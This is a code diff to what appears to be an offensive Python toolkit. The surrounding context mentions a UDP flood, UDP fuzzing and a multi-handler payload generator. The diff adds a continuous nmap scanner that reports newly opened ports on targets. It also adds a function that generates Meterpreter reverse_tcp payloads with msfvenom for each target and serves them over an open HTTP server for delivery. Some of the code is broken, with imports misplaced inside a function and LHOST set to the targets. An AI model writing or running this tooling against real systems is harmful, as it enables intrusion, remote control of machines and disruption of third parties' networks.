@@ -130,13 +130,18 @@ try:
 except KeyboardInterrupt:
     print("UDP flood interrupted by user.")
 
-def run_nmap_forever(targets):
+
+# Run nmap against the target IPs to find open ports
+def scan_for_new_ports(targets, interval=60):
     """
-    Continuously runs nmap against the given targets until no more open ports are found.
+    Periodically scans the given targets for newly opened ports using nmap.
+
+    :param targets: List of target IP addresses.
+    :param interval: Time in seconds between scans.
     """
+    previous_results = {ip: set() for ip in targets}
     try:
-        while targets:
-            remaining_targets = []
+        while True:
             for target in targets:
                 result = subprocess.run(
                     ["nmap", "-Pn", "-p-", target],
@@ -144,18 +149,62 @@ def run_nmap_forever(targets):
                     stderr=subprocess.PIPE,
                     text=True
                 )
-                print(result.stdout)
-                if "open" in result.stdout:
-                    remaining_targets.append(target)
-            if not remaining_targets:
-                print("No more targets with open ports. Stopping Nmap loop.")
-                break
-            targets = remaining_targets
+                open_ports = set()
+                for line in result.stdout.splitlines():
+                    if "/tcp" in line and "open" in line:
+                        port = line.split("/")[0].strip()
+                        open_ports.add(port)
+                new_ports = open_ports - previous_results[target]
+                if new_ports:
+                    print(f"New open ports on {target}: {', '.join(new_ports)}")
+                previous_results[target] = open_ports
+            time.sleep(interval)
     except KeyboardInterrupt:
-        print("Nmap loop interrupted by user.")
+        print("Port scanning interrupted by user.")
 
 # Example usage:
-run_nmap_forever(target_ips)
+scan_for_new_ports(target_ips)
+
+def serve_payloads_with_msfvenom(payload_type, lport, output_dir="payloads"):
+    """
+    Generates msfvenom payloads for each target IP and serves them via a simple HTTP server.
+
+    :param payload_type: The msfvenom payload type (e.g., windows/meterpreter/reverse_tcp)
+    :param lport: The local port for reverse connection
+    :param output_dir: Directory to store generated payloads
+    """
+
+    os.makedirs(output_dir, exist_ok=True)
+    payload_files = []
+    for ip in target_ips:
+        output_file = os.path.join(output_dir, f"payload_{ip.replace('.', '_')}.bin")
+        cmd = [
+            "msfvenom",
+            "-p", payload_type,
+            f"LHOST={ip}",
+            f"LPORT={lport}",
+            "-f", "raw",
+            "-o", output_file
+        ]
+        try:
+            subprocess.run(cmd, check=True)
+            print(f"Generated payload for {ip}: {output_file}")
+            payload_files.append(output_file)
+        except subprocess.CalledProcessError as e:
+            print(f"Failed to generate payload for {ip}: {e}")
+
+    # Serve the payloads via HTTP
+    os.chdir(output_dir)
+    server_address = ("0.0.0.0", 8000)
+    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
+    print(f"Serving payloads at http://{server_address[0]}:{server_address[1]}/")
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("HTTP server stopped.")
+
+# Example usage:
+# serve_payloads_with_msfvenom("windows/meterpreter/reverse_tcp", 4444)
 
 def udp_fuzzing(target_ips, target_ports):
     """
@@ -457,6 +506,8 @@ def create_multihandler_payload(payload_type, lhost_list, lport, output_file_pre
     :param output_file_prefix: Prefix for the generated payload files
     """
     import subprocess
+import os
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 
     for idx, lhost in enumerate(lhost_list):
         output_file = f"{output_file_prefix}_{lhost.replace('.', '_')}.bin"
